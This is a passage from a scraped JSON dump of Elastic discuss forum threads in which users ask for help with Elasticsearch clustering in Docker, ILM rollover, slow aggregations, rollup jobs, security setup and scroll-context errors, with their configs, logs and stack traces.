    "body": "Hi, I've been running an Elasticsearch instance using Docker and docker-compose on host A. The configs are version: '2.2' services: es01: build: . container_name: es01 environment: - node.name=es01 - cluster.name=es-docker-cluster - cluster.initial_master_nodes=es01 - network.host=0.0.0.0 - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" ulimits: memlock: soft: -1 hard: -1 volumes: - ./data01:/usr/share/elasticsearch/data ports: - 9200:9200 - 9300:9300 networks: - elastic networks: elastic: driver: bridge and FROM docker.elastic.co/elasticsearch/elasticsearch:7.6.2 RUN /usr/share/elasticsearch/bin/elasticsearch-plugin install analysis-icu RUN /usr/share/elasticsearch/bin/elasticsearch-plugin install analysis-kuromoji This is up and running successfully. I've already added several documents and indices. GET /_cluster/health?pretty { \"cluster_name\" : \"es-docker-cluster\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 16, \"active_shards\" : 16, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 13, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 55.172413793103445 } What I want to do is add a node to this cluster which is running on another host B. So I set up host B and tried to join a node to the cluster. version: '2.2' services: es02: build: . container_name: es02 environment: - node.name=es02 - cluster.name=es-docker-cluster - discovery.seed_hosts=10.146.0.2 - cluster.initial_master_nodes=es01 - network.host=0.0.0.0 - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" ulimits: memlock: soft: -1 hard: -1 volumes: - ./data02:/usr/share/elasticsearch/data ports: - 9200:9200 - 9300:9300 networks: - elastic networks: elastic: driver: bridge and the same Dockerfile as host A. But the discovery process never ends and the node cannot join the cluster. {\"type\": \"server\", \"timestamp\": \"2020-04-17T13:18:32,258Z\", \"level\": \"WARN\", \"component\": \"o.e.c.c.ClusterFormationFailureHelper\", \"cluster.name\": \"es-docker-cluster\", \"node.name\": \"es02\", \"message\": \"master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster, and this node must discover master-eligible nodes [es01] to bootstrap a cluster: have discovered [{es02}{k5uDRt9aQCqCf-sVlGmQ8A}{_Miq00-CT6igXR5lFgzt6g}{172.19.0.2}{172.19.0.2:9300}{dilm}{ml.machine_memory=4148080640, xpack.installed=true, ml.max_open_jobs=20}]; discovery will continue using [10.146.0.2:9300] from hosts providers and [{es02}{k5uDRt9aQCqCf-sVlGmQ8A}{_Miq00-CT6igXR5lFgzt6g}{172.19.0.2}{172.19.0.2:9300}{dilm}{ml.machine_memory=4148080640, xpack.installed=true, ml.max_open_jobs=20}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\" } Looks like the docker container on host B reaches the docker container on host A. $ sudo docker exec -it es02 sh sh-4.2# curl 10.146.0.2:9200 { \"name\" : \"es01\", \"cluster_name\" : \"es-docker-cluster\", \"cluster_uuid\" : \"mAXf03ZXReS6Gun1HyMGsg\", \"version\" : { \"number\" : \"7.6.2\", \"build_flavor\" : \"default\", \"build_type\" : \"docker\", \"build_hash\" : \"ef48eb35cf30adf4db14086e8aabd07ef6fb113f\", \"build_date\" : \"2020-03-26T06:34:37.794943Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.4.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } Also, when I change the cluster.name on the ES instance on the docker container on host A, the error message changes, which means the ES instance on the docker container on host B recognizes host A, so the network seems to be configured correctly. What can I do?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bcf6cf1b-a7d3-4052-99d9-87495c9ada81",
    "url": "https://discuss.elastic.co/t/visual-basic-examples-for-elasticsearch-net-and-nest/226304",
    "title": "Visual Basic Examples for ElasticSearch.net and NEST",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 3, 2020, 2:04pm April 13, 2020, 8:15am April 14, 2020, 4:42pm April 15, 2020, 1:49am April 15, 2020, 1:56am April 15, 2020, 2:11am April 15, 2020, 11:40am April 15, 2020, 6:52pm April 16, 2020, 1:00am April 16, 2020, 1:05am April 16, 2020, 1:21am April 16, 2020, 1:41am April 16, 2020, 2:03am April 17, 2020, 5:32pm April 17, 2020, 10:30pm April 17, 2020, 11:00pm April 17, 2020, 11:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "291ab9f5-40d6-4f63-ad60-c454804dac56",
    "url": "https://discuss.elastic.co/t/index-and-lifecycle-error-and-failed-to-rotate-to-warm-phrase-by-ilm/227570",
    "title": "Index and lifecycle error and failed to rotate to warm phrase by ILM",
    "category": [
      "Elasticsearch"
    ],
    "author": "chunan",
    "date": "April 10, 2020, 11:16pm April 10, 2020, 11:23pm April 10, 2020, 11:25pm April 10, 2020, 11:26pm April 11, 2020, 12:16am April 13, 2020, 4:49pm April 13, 2020, 4:58pm April 13, 2020, 5:19pm April 15, 2020, 5:30pm April 15, 2020, 10:09pm April 16, 2020, 11:48am April 17, 2020, 11:14pm April 17, 2020, 11:13pm April 17, 2020, 11:13pm",
    "body": "vector-diags-000005 failed to rotate. As you can see, 000004 was automatically rotated to 000005. But 000005 continued on to grow in size until it errors out. vector-diags-000005 3 P STARTED 1745886 262.8mb 192.168.146.54 es-data-r2-4 vector-diags-000005 1 P STARTED 2727704 374.5mb 192.168.156.114 es-data-r1-4 vector-diags-000005 5 P STARTED 2734417 379.9mb 192.168.142.170 es-data-r1-2 vector-diags-000005 0 P STARTED 2734853 374.7mb 192.168.187.119 es-data-r2-3 vector-diags-000005 4 P STARTED 2754168 375.1mb 192.168.180.247 es-data-r1-0 vector-diags-000005 2 P STARTED 2768421 374.8mb 192.168.173.185 es-data-r1-3 vector-diags-000004 5 P STARTED 86699 10.2mb 192.168.187.119 es-data-r2-3 vector-diags-000004 2 P STARTED 89166 10.5mb 192.168.173.185 es-data-r1-3 vector-diags-000004 4 P STARTED 90304 10.7mb 192.168.156.114 es-data-r1-4 vector-diags-000004 3 P STARTED 90890 10.7mb 192.168.131.218 es-data-r2-5 vector-diags-000004 0 P STARTED 90953 10.7mb 192.168.163.252 es-data-r2-2",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "51f3844e-14e8-406c-8079-626a2ca09984",
    "url": "https://discuss.elastic.co/t/elasticsearch-avg-aggregation-is-taking-ages-to-return-in-7-2/228493",
    "title": "Elasticsearch avg aggregation is taking ages to return in 7.2",
    "category": [
      "Elasticsearch"
    ],
    "author": "Faiz_Ahmed_Mushtak_H",
    "date": "April 17, 2020, 10:27pm",
    "body": "We recently moved from 1.7 to 7.2 and I was running some aggregations to verify a few statistics { \"size\": 0, \"aggs\": { \"avgcsat\": { \"avg\": { \"field\": \"csat\" } } } } The csat field is an integer. Doc values are enabled for it by default (i.e. we never set it explicitly) The same query when executed on 1.7 returned the result in almost 600ms. In 7.2 the query is not even returning and I see an increase in load & CPU on data nodes We have around 2TB of data (~220495625 documents) This field only contains 5 type of values 0,1,2,3,4,5 We have one other field called state which is of long data type, and when I did an avg aggregation on it, the results were returned instantaneously. Some issue with integer data type it seems then? The csat field is a sparse field as compared to the state field Mapping of the two fields { \"state\": { \"type\": \"long\", \"store\": true, \"null_value\": 0 } } { \"csat\": { \"type\": \"integer\", \"store\": true } } Update Not only avg, but even term aggregation, histogram is taking a lot of time for csat as compared to state Here is what hot thread is showing for one node (its same for every other node) 96.5% (482.4ms out of 500ms) cpu usage by thread 'elasticsearch[es7advcl02-14][search][T#8]' 10/10 snapshots sharing following 39 elements app//org.apache.lucene.codecs.lucene80.IndexedDISI.advanceExact(IndexedDISI.java:399) app//org.apache.lucene.codecs.lucene80.Lucene80DocValuesProducer$SparseNumericDocValues.advanceExact(Lucene80DocValuesProducer.java:424) app//org.elasticsearch.index.fielddata.FieldData$DoubleCastedValues.advanceExact(FieldData.java:446) app//org.elasticsearch.index.fielddata.SingletonSortedNumericDoubleValues.advanceExact(SingletonSortedNumericDoubleValues.java:44) app//org.elasticsearch.search.aggregations.metrics.AvgAggregator$1.collect(AvgAggregator.java:83) app//org.elasticsearch.search.aggregations.LeafBucketCollector.collect(LeafBucketCollector.java:82) app//org.apache.lucene.search.MatchAllDocsQuery$1$1.score(MatchAllDocsQuery.java:64) app//org.apache.lucene.search.BulkScorer.score(BulkScorer.java:39) app//org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:652) app//org.apache.lucene.search.XIndexSearcher.search(XIndexSearcher.java:44) app//org.elasticsearch.search.internal.ContextIndexSearcher.search(ContextIndexSearcher.java:177) app//org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:443) app//org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:271) app//org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:114) app//org.elasticsearch.indices.IndicesService.lambda$loadIntoContext$18(IndicesService.java:1305) app//org.elasticsearch.indices.IndicesService$$Lambda$4388/0x0000000802064840.accept(Unknown Source) app//org.elasticsearch.indices.IndicesService.lambda$cacheShardLevelResult$19(IndicesService.java:1362) app//org.elasticsearch.indices.IndicesService$$Lambda$4389/0x0000000802064c40.get(Unknown Source) app//org.elasticsearch.indices.IndicesRequestCache$Loader.load(IndicesRequestCache.java:174) app//org.elasticsearch.indices.IndicesRequestCache$Loader.load(IndicesRequestCache.java:157) app//org.elasticsearch.common.cache.Cache.computeIfAbsent(Cache.java:433) app//org.elasticsearch.indices.IndicesRequestCache.getOrCompute(IndicesRequestCache.java:123) app//org.elasticsearch.indices.IndicesService.cacheShardLevelResult(IndicesService.java:1368) app//org.elasticsearch.indices.IndicesService.loadIntoContext(IndicesService.java:1302) app//org.elasticsearch.search.SearchService.loadOrExecuteQueryPhase(SearchService.java:333) app//org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:360) app//org.elasticsearch.search.SearchService.lambda$executeQueryPhase$1(SearchService.java:340) app//org.elasticsearch.search.SearchService$$Lambda$4236/0x0000000802024040.apply(Unknown Source) app//org.elasticsearch.action.ActionListener.lambda$map$2(ActionListener.java:145) app//org.elasticsearch.action.ActionListener$$Lambda$3643/0x0000000801dab040.accept(Unknown Source) app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:62) app//org.elasticsearch.search.SearchService$2.doRun(SearchService.java:1052) app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) app//org.elasticsearch.common.util.concurrent.TimedRunnable.doRun(TimedRunnable.java:44) app//org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:758) app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) java.base@12.0.1/java.lang.Thread.run(Thread.java:835) One other observation Since I mentioned csat is a sparse field, i added exists filter in my query to only consider docs that have csat field set. The query execution time reduce drastically, but is the right way to go? Why aggregation is slow if i do not provide exists filter? I'm also not sure if document count is playing a role here First I aggregated just using query A which had X docs (slow) query A + exists filter which had Y docs. X > Y (fast) query B which has M docs M > X (much much greater) (slowww) query B + exists filter which has N docs M > N > X > Y (fast) As you see, if more docs indeed was the culprit then query 4 should've been slow too right? But it was fast",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3e17235f-7c5a-42a5-85fe-d006329ca539",
    "url": "https://discuss.elastic.co/t/typeerror-unhashable-type-term/228594",
    "title": "TypeError: unhashable type: \"Term\"",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 17, 2020, 10:23pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "223139ff-2b74-4a6b-ba17-05f04b4841c7",
    "url": "https://discuss.elastic.co/t/rollup-job-lost-some-data/228593",
    "title": "Rollup job lost some data",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jason_Du",
    "date": "April 17, 2020, 10:13pm",
    "body": "I have a rollup job, it does daily aggregations. But for unknown reason, some data not included in the rollup index. The job was created at the beginning of each month and was running in the started state until the end of the month. The rollup index documents and size increased day by day. But at the end of the month, if I create another rollup job with same settings and run it again, it will create another rollup index with 1 million documents difference. When searching both of them, I can find some documents only exist in the new rollup index. I looked into the elasticsearch log, it only has a lot of warnings and some JVM GC log. Are there any logs for rollup jobs except the log in /var/log/elasticsearch folder? Anyone had same issue when using rollup jobs? The ES version is 6.5.2. Logs: [2020-03-17T00:28:27,000][WARN ][o.e.x.c.i.AsyncTwoPhaseIndexer] [es-data-234234242342342] Schedule was triggered for job [rollup_readings_xxxx_v2_job], but prior indexer is still running. [2020-03-17T11:00:02,688][INFO ][o.e.m.j.JvmGcMonitorService] [es-data-234234242342342] [gc][16962357] overhead, spent [320ms] collecting in the last [1s] { \"config\" : { \"id\" : \"rollup_xxxx_days_v2_job\", \"index_pattern\" : \"xxxx*_v2\", \"rollup_index\" : \"rollup_xxxx_days_v2\", \"cron\" : \"* * */12 * * ?\", \"groups\" : { \"date_histogram\" : { \"interval\" : \"1d\", \"field\" : \"created_at\", \"delay\" : \"12h\", \"time_zone\" : \"UTC\" }, \"terms\" : { \"fields\" : [ \"aid\", \"uid\", \"did\", \"sid\", \"evt\" ] } }, \"metrics\" : [ { \"field\" : \"value\", \"metrics\" : [ \"avg\", \"min\", \"max\", \"sum\", \"value_count\" ] }, { \"field\" : \"geo_lat\", \"metrics\" : [ \"avg\" ] }, { \"field\" : \"geo_lon\", \"metrics\" : [ \"avg\" ] }, { \"field\" : \"yy\", \"metrics\" : [ \"value_count\" ] } ], \"timeout\" : \"20s\", \"page_size\" : 9216 } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b4889d47-79c9-45ca-8f12-4f272c9e2692",
    "url": "https://discuss.elastic.co/t/indexing-strategy-for-small-iot-sensor-data-project/228589",
    "title": "Indexing strategy for small IoT sensor data project",
    "category": [
      "Elasticsearch"
    ],
    "author": "vanessa",
    "date": "April 17, 2020, 9:46pm",
    "body": "Hello! We are new to Elasticsearch and want to use Elastic Stack for our data pipeline project. Basically we have a vehicle with multiple IMU (motion) sensors and we want to figure out the most efficient way to index our data in Elasticsearch. Data will not be flowing constantly to start. It would come through whenever the vehicle is moving, which is what we are calling a session. So there could be two sessions in one day, but that could be the only activity for a whole week. That's not to say we won't scale up eventually, but to start the amount of data flowing in will be relatively small. Now, we were thinking we want to create an index per session so that we could easily jump into that index and analyze/visualize the data. But now I'm wondering if it would be an easier setup to have data for the week and then query for the specific session? Some guidance from ES veterans would be much appreciated :).",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4a558ec3-b703-4011-8a2a-a0f1a262b5c0",
    "url": "https://discuss.elastic.co/t/terms-agregation/228586",
    "title": "Terms agregation",
    "category": [
      "Elasticsearch"
    ],
    "author": "ilhem",
    "date": "April 17, 2020, 9:30pm",
    "body": "By default, the terms aggregation will return the buckets for the top ten terms ordered by the doc_count . I want to get buckets for all terms (without setting the size parameter) is it possible?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "0f08a577-b486-4abb-8d0a-bfc516865516",
    "url": "https://discuss.elastic.co/t/only-in-aws-lambda-json-parse-exception-illegal-character-ctrl-char-code-31/228585",
    "title": "Only in AWS Lambda: Json_parse_exception Illegal character CTRL-CHAR code 31",
    "category": [
      "Elasticsearch"
    ],
    "author": "derrickl",
    "date": "April 17, 2020, 9:25pm",
    "body": "Hi all, I'm using the python Elasticsearch library to query an index. When I run the search on AWS Lambda I get this json_parse_execption: \"errorMessage\": \"TransportError(500, 'json_parse_exception', 'Illegal character ((CTRL-CHAR, code 31)): only regular white space (\\\\\\\\r, \\\\\\\\n, \\\\\\\\t) is allowed between tokens\\\\n at [Source: org.elasticsearch.common.bytes.BytesReference$MarkSupportingStreamInputWrapper@2841b17e; line: 1, column: 2]')\", \"errorType\": \"TransportError\" However, when I run the code locally, the same body argument works perfectly. Additionally, I can use this syntax in Kibana and get correct results. posts = { \"aggs\": { \"id\": { \"terms\": { \"field\": \"content.id\" }, \"aggregations\": { \"eng_avg\": { \"avg\": { \"field\": \"content.engagement\" } }, \"fol_avg\": { \"avg\": { \"field\": \"content.followers\" } } } } }, \"query\": { \"range\": { \"content.timestamp\": { \"gte\": \"now-90d\" } } }, \"size\": 0 } es_results = es_client.search(index=\"social_posts\", body=posts) I've been staring at this Json body for a while and can't see any issues with it... maybe I missed something? When I test the code in AWS Lambda without any body=<json> results are returned... so the ES client seems to be talking to the Custer. Any thoughts would be lovely. Thank you!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e3cc872d-fb1b-4965-89d2-0f9f816b8dfc",
    "url": "https://discuss.elastic.co/t/can-curl-https-elasticsearch-9200-from-host-but-connection-refused-in-kibana-container/228562",
    "title": "Can curl https://elasticsearch:9200 from host, but connection refused in kibana container",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 17, 2020, 7:25pm April 17, 2020, 8:08pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0e61a923-b33d-4cd3-b539-0fd85f4efd53",
    "url": "https://discuss.elastic.co/t/index-privilege-to-update-setting/228570",
    "title": "Index privilege to update setting",
    "category": [
      "Elasticsearch"
    ],
    "author": "YvorL",
    "date": "April 17, 2020, 7:55pm",
    "body": "Hi! I'm trying to create a user that's restricted to updating settings ([indices:admin/settings/update]) for indices, but it seems that I can only give \"all\" or \"manage\" but both can delete indices that I don't want. I see three different roles for ILM but can't find anything that'd be able to update index settings without giving permission to delete the index itself. Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "25f96a60-e30d-40d3-9d13-9f81e81c43cb",
    "url": "https://discuss.elastic.co/t/securing-elk/228359",
    "title": "Securing ELK",
    "category": [
      "Elasticsearch"
    ],
    "author": "ManuelF",
    "date": "April 16, 2020, 3:47pm April 17, 2020, 7:53pm",
    "body": "Hi, I am trying to secure my ELK. I have been checking some documentation, tutorials and also topics in discuss.elastic.co, but everybody shows different steps and settings enabled, so I am confused. *Note: I am using ELK 6.8.8 with Basic License + running on Debian 10 My goals are: 1- Secure internal ELK communication 2- Secure foreign connections (be able to use https) coming from different beats (PCs and servers out of the ELK network) to ES, Kibana and Logstash 3- Create different users with different level access, so each one can see only specific dashboards Questions: 1- What comes 1st?: a) Enable xpack security in Elasticsearch .yml b) Generate a certificate 2- Should I set my cluster as a CA? 3- Which tool should I use to generate the certificate?: a) /usr/share/elasticsearch/bin/elasticsearch-certutil b) /usr/share/elasticsearch/bin/x-pack/certutil c) If I can use any of the above, then which one would be recommended as the best option? 4- Cert format \"p12\" vs \"PEM\". Do I need to select one or the tool being used to generate the cert will determine the output format? 5- Which tool should I use to generate the system passwords (ES, Kibana, etc.)?: a) /usr/share/elasticsearch/bin/elasticsearch-setup-passwords b) /usr/share/elasticsearch/bin/x-pack/setup-passwords 6- Should I use: a) elasticsearch-keystore b) kibana-keystore c) Both 7- Should I use: a) \"xpack.security.transport.ssl\" ? b) \"xpack.security.http.ssl\" ? c) \"xpack.monitoring\" ? c) All? Maybe there are a lot of questions, but I would appreciate and it would be helpful if you could answer them all. Thanks in advance",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "962b6415-a329-434b-8bb5-517bd5e2e605",
    "url": "https://discuss.elastic.co/t/too-many-scroll-contexts-error-while-running-scroll-request-through-resthighlevelclient-in-elasticsearch-7-3-2/228560",
    "title": "Too many scroll contexts error while running Scroll request through RestHighLevelClient in ElasticSearch 7.3.2",
    "category": [
      "Elasticsearch"
    ],
    "author": "Nazim_Hussain",
    "date": "April 17, 2020, 7:47pm",
    "body": "Hi, I am new to ES and we migrated from ES 6 to ES 7 recently, but while making a Scroll search call, we are getting following error: org.elasticsearch.ElasticsearchStatusException: Elasticsearch exception [type=search_phase_execution_exception, reason=all shards failed] at org.elasticsearch.rest.BytesRestResponse.errorFromXContent(BytesRestResponse.java:177) at org.elasticsearch.client.RestHighLevelClient.parseEntity(RestHighLevelClient.java:1727) at org.elasticsearch.client.RestHighLevelClient.parseResponseException(RestHighLevelClient.java:1704) at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1467) at org.elasticsearch.client.RestHighLevelClient.performRequest(RestHighLevelClient.java:1424) at org.elasticsearch.client.RestHighLevelClient.performRequestAndParseEntity(RestHighLevelClient.java:1394) at org.elasticsearch.client.RestHighLevelClient.search(RestHighLevelClient.java:930) at com.mycomp.www.dts.api.lookup.KeyLookup.search(KeyLookup.java:63) at com.mycomp.www.dts.api.lookup.ValueLookup.query(ValueLookup.java:72) at com.mycomp.www.dts.api.resources.ValueSearchResource.search(ValueSearchResource.java:60) at sun.reflect.GeneratedMethodAccessor55.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.glassfish.jersey.server.model.internal.ResourceMethodInvocationHandlerFactory$1.invoke(ResourceMethodInvocationHandlerFactory.java:81) at org.glassfish.jersey.server.model.internal.AbstractJavaResourceMethodDispatcher$1.run(AbstractJavaResourceMethodDispatcher.java:144) at org.glassfish.jersey.server.model.internal.AbstractJavaResourceMethodDispatcher.invoke(AbstractJavaResourceMethodDispatcher.java:161) at org.glassfish.jersey.server.model.internal.JavaResourceMethodDispatcherProvider$VoidOutInvoker.doDispatch(JavaResourceMethodDispatcherProvider.java:143) at org.glassfish.jersey.server.model.internal.AbstractJavaResourceMethodDispatcher.dispatch(AbstractJavaResourceMethodDispatcher.java:99) at org.glassfish.jersey.server.model.ResourceMethodInvoker.invoke(ResourceMethodInvoker.java:389) at org.glassfish.jersey.server.model.ResourceMethodInvoker.apply(ResourceMethodInvoker.java:347) at org.glassfish.jersey.server.model.ResourceMethodInvoker.apply(ResourceMethodInvoker.java:102) at org.glassfish.jersey.server.ServerRuntime$2.run(ServerRuntime.java:326) at org.glassfish.jersey.internal.Errors$1.call(Errors.java:271) at org.glassfish.jersey.internal.Errors$1.call(Errors.java:267) at org.glassfish.jersey.internal.Errors.process(Errors.java:315) at org.glassfish.jersey.internal.Errors.process(Errors.java:297) at org.glassfish.jersey.internal.Errors.process(Errors.java:267) at org.glassfish.jersey.process.internal.RequestScope.runInScope(RequestScope.java:317) at org.glassfish.jersey.server.ServerRuntime.process(ServerRuntime.java:305) at org.glassfish.jersey.server.ApplicationHandler.handle(ApplicationHandler.java:1154) at org.glassfish.jersey.servlet.WebComponent.serviceImpl(WebComponent.java:473) at org.glassfish.jersey.servlet.WebComponent.service(WebComponent.java:427) at org.glassfish.jersey.servlet.ServletContainer.service(ServletContainer.java:388) at org.glassfish.jersey.servlet.ServletContainer.service(ServletContainer.java:341) at org.glassfish.jersey.servlet.ServletContainer.service(ServletContainer.java:228) at io.dropwizard.jetty.NonblockingServletHolder.handle(NonblockingServletHolder.java:49) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1623) at io.dropwizard.servlets.ThreadNameFilter.doFilter(ThreadNameFilter.java:35) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) at io.dropwizard.jersey.filter.AllowedMethodsFilter.handle(AllowedMethodsFilter.java:45) at io.dropwizard.jersey.filter.AllowedMethodsFilter.doFilter(AllowedMethodsFilter.java:39) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) at org.eclipse.jetty.servlets.CrossOriginFilter.handle(CrossOriginFilter.java:311) at org.eclipse.jetty.servlets.CrossOriginFilter.doFilter(CrossOriginFilter.java:265) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:540) at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:255) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1345) at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:203) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:480) at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:201) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1247) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:144) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132) at com.codahale.metrics.jetty9.InstrumentedHandler.handle(InstrumentedHandler.java:239) at io.dropwizard.jetty.RoutingHandler.handle(RoutingHandler.java:52) at org.eclipse.jetty.server.handler.gzip.GzipHandler.handle(GzipHandler.java:703) at io.dropwizard.jetty.BiDiGzipHandler.handle(BiDiGzipHandler.java:67) at org.eclipse.jetty.server.handler.RequestLogHandler.handle(RequestLogHandler.java:56) at org.eclipse.jetty.server.handler.StatisticsHandler.handle(StatisticsHandler.java:174) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132) at org.eclipse.jetty.server.Server.handle(Server.java:505) at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:370) at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:267) at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:305) at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103) at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117) at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:698) at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:804) at java.lang.Thread.run(Thread.java:748) Suppressed: org.elasticsearch.client.ResponseException: method [POST], host [http://1.1.1.111:9200], URI [/myapp-time_series/_search?typed_keys=true&ignore_unavailable=false&expand_wildcards=open&allow_no_indices=true&ignore_throttled=true&scroll=1m&search_type=query_then_fetch&batched_reduce_size=512&ccs_minimize_roundtrips=true], status line [HTTP/1.1 500 Internal Server Error] {\"error\":{\"root_cause\":[{\"type\":\"exception\",\"reason\":\"Trying to create too many scroll contexts. Must be less than or equal to: [500]. This limit can be set by changing the [search.max_open_scroll_context] setting.\"}],\"type\":\"search_phase_execution_exception\",\"reason\":\"all shards failed\",\"phase\":\"query\",\"grouped\":true,\"failed_shards\":[{\"shard\":0,\"index\":\"myapp-time_series\",\"node\":\"dVU8MrD4SQuLz7HFePrlyw\",\"reason\":{\"type\":\"exception\",\"reason\":\"Trying to create too many scroll contexts. Must be less than or equal to: [500]. This limit can be set by changing the [search.max_open_scroll_context] setting.\"}}]},\"status\":500} at org.elasticsearch.client.RestClient.convertResponse(RestClient.java:253) at org.elasticsearch.client.RestClient.performRequest(RestClient.java:231) at org.elasticsearch.client.RestClient.performRequest(RestClient.java:205) at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1454) This is how the search method looks like: final List<KeySearchResponse> result = new ArrayList<>(); try { final SearchSourceBuilder sourceBuilder = new SearchSourceBuilder() .query(getKeyMapQuery(replaceDot(keys), keyNamesFilter)) .size(size > 3000 ? 3000 : size) .from(0); final Scroll scroll = new Scroll(TimeValue.timeValueSeconds(60L); final SearchRequest searchRequest = getScrollSearchRequest(scroll, sourceBuilder); SearchResponse searchResponse = client.search(searchRequest, RequestOptions.DEFAULT); Timer.Context ctxt = esRequestTimer.time(); String scrollId = searchResponse.getScrollId(); SearchHits hits = searchResponse.getHits(); addHitsToResultMap(result, hits); ctxt.close(); SearchScrollRequest scrollRequest; while (hits != null && hits.getHits().length > 0 && result.size() < size) { scrollRequest = new SearchScrollRequest(scrollId); ctxt = esRequestTimer.time(); scrollRequest.scroll(scroll); searchResponse = client.scroll(scrollRequest, RequestOptions.DEFAULT); hits = searchResponse.getHits(); addHitsToResultMap(result, hits); scrollId = searchResponse.getScrollId(); ctxt.close(); } final ClearScrollRequest clearScrollRequest = new ClearScrollRequest(); clearScrollRequest.addScrollId(scrollId); final ClearScrollResponse clearScrollResponse = client.clearScroll(clearScrollRequest, RequestOptions.DEFAULT); } catch (IllegalStateException ise){ LOGGER.error(\"IllegalStateException, seems HTTP Rest Client is stale, recreating the client connection pool!\"); client = ESRestClientFactory.resetRestClient(this.esConf); } catch (Exception e) { LOGGER.warn(\"Exception in retrieving results from ES\", e); } return result; } private BoolQueryBuilder getKeyMapQuery(KeyMap keys, boolean keyNamesFilter) { BoolQueryBuilder queryBuilder = QueryBuilders.boolQuery(); filtersForKeys(keys, keyNamesFilter).forEach(queryBuilder::must); return queryBuilder; } dependencies: <dependency> <groupId>org.elasticsearch.client</groupId> <artifactId>elasticsearch-rest-client</artifactId> <version>7.3.2</version> </dependency> <dependency> <groupId>org.elasticsearch.client</groupId> <artifactId>elasticsearch-rest-high-level-client</artifactId> <version>7.3.2</version> </dependency> This was working fine with ES6. Any pointers on this would be greatly appreciated.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "107a996e-2dc2-42f6-86b7-8fdf8b8b7380",
    "url": "https://discuss.elastic.co/t/elk-watcher-painless-script-stream-filter/228392",
    "title": "ELK watcher : painless script - stream.filter",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jags",
    "date": "April 16, 2020, 9:51pm April 16, 2020, 10:27pm April 16, 2020, 11:37pm April 17, 2020, 6:43pm",
